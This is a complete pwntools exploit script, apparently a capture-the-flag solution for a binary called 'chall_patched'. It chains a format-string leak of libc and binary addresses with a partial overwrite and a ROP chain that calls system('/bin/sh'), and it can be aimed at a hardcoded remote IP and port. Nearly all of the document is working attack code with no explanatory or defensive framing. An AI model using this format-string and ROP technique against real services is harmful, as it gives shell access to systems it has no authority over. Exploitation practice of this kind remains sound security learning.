from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("34.29.214.123", 5000)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *vuln+61
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop=True)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

payload = f"%33$p.%22$p.%{0x51f0-15-15}c%22$hn".encode()
payload = payload.ljust(0x79, b'a')
payload += b'\x18\x80'

s(payload)
libc.address = int(ru("."), 16) - 0x2a28b
elf.address = int(ru("."), 16) - 0x4018
ic(hex(libc.address))
ic(hex(elf.address))
pause()

payload = f'%{0x5248}c%26$hn'.encode()
payload = payload.ljust(0x11, b'a')
payload += p64(qgad(libc, "rdi"))
payload += p64(binsh(libc))
payload += p64(gad(libc, ['ret']))
payload += p64(libc.sym['system'])
s(payload)

io.interactive()
